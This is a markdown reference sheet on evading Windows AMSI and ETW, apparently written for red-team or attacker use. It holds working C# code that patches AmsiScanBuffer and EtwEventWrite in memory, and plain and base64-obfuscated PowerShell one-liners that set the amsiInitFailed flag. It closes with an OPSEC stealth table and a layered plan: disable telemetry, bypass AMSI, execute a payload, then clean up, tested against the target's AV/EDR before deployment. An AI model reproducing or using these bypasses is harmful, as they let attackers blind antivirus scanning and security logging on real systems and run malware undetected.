# AMSI Bypass Techniques — Deep Reference

## AMSI Architecture

```
PowerShell/Script Host
    ↓
AmsiInitialize() → AmsiContext
    ↓
AmsiScanBuffer() / AmsiScanString()
    ↓
Registered AV Provider (e.g., Windows Defender)
    ↓
Result: AMSI_RESULT_CLEAN / AMSI_RESULT_DETECTED
```

## Bypass Method 1: Memory Patching (amsi.dll)

### Classic AmsiScanBuffer Patch
```csharp
// Patches AmsiScanBuffer to return AMSI_RESULT_CLEAN
// Target: amsi.dll!AmsiScanBuffer
// Patch bytes: mov eax, 0x80070057 (E_INVALIDARG); ret

// C# implementation
var lib = LoadLibrary("amsi.dll");
var addr = GetProcAddress(lib, "AmsiScanBuffer");
VirtualProtect(addr, (UIntPtr)5, 0x40, out uint oldProtect);
Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, 6);
VirtualProtect(addr, (UIntPtr)5, oldProtect, out _);
```

### PowerShell One-Liner (Obfuscated)
```powershell
# Base pattern (will be caught — for reference only)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscation required — string splitting, variable substitution, encoding
$a=[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA'))))
$a.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

## Bypass Method 2: Hardware Breakpoints

```csharp
// Set hardware breakpoint on AmsiScanBuffer
// When triggered, modify return value in registers
// No memory modification — evades integrity checks

// 1. Get AmsiScanBuffer address
// 2. Set DR0 = address, DR7 = enable breakpoint
// 3. Exception handler modifies RAX to AMSI_RESULT_CLEAN
// 4. Continue execution
```

**Advantages**: No memory patches, survives integrity checks
**Disadvantages**: Per-thread, more complex implementation

## Bypass Method 3: Reflection (Type Confusion)

```powershell
# Force amsiInitFailed flag via reflection
# Targets: AmsiUtils private static field

# Technique: Access non-public type, set initialization failure flag
# Effect: All subsequent AMSI scans return clean
```

## ETW Patching

```csharp
// Patch EtwEventWrite to disable event tracing
// Target: ntdll.dll!EtwEventWrite
// Patch: ret (0xC3) at function entry

var ntdll = LoadLibrary("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out uint oldProtect);
Marshal.WriteByte(etwAddr, 0xC3); // ret
VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out _);
```

## Detection & OPSEC

| Bypass Method | Detection Vector | Stealth Rating |
|---------------|-----------------|----------------|
| Memory patch (AmsiScanBuffer) | Integrity checks, ETW | Medium |
| amsiInitFailed flag | .NET event tracing | Medium |
| Hardware breakpoints | Thread context inspection | High |
| ETW patch | Kernel-level ETW monitoring | Medium-High |
| CLR hooking | CLR profiling API | High |

### Recommended Approach (Layered)
1. Patch ETW first (prevent telemetry)
2. Apply AMSI bypass (memory patch or HW breakpoints)
3. Execute payload
4. Restore patches if possible (cleanup)

### Key Considerations
- Always patch ETW before AMSI (ETW can report AMSI bypass attempts)
- Different bypass needed per .NET CLR version
- PowerShell Constrained Language Mode blocks reflection-based bypasses
- Test bypass against target's specific AV/EDR before deployment
